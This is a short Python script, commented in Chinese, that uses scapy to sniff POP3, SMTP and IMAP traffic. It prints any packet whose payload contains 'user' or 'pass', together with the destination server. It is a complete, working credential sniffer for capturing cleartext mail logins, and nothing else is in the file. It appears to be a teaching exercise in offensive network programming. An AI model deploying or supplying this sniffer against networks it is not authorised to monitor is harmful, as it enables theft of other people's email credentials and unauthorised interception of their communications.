from scapy.all import *

#封包回呼函式

def packet_callback(packet):
    #察看是否收到資料
    if packet[TCP].payload: 
        mail_packet = str(packet[TCP].payload)
         #判斷是否收到"user" "pass"認證指令
        if "user" in mail_packet.lower() or "pass" in mail_packet.lower():
            #偵測到驗證就打印出傳送目標，和封包內容
            print("[*] Server: %s " %packet[IP].dst)
            print("[*] %s" %packet[TCP].payload)


#啟動我們的監聽程式
#納入常見110(POP) 25(SMTP) 143(IMAP)            
sniff(filter="tcp port 110 or tcp port 25 or tcp port 143",prn=packet_callback,store=0)
#用store=0 確保scapy不把封包在記憶體
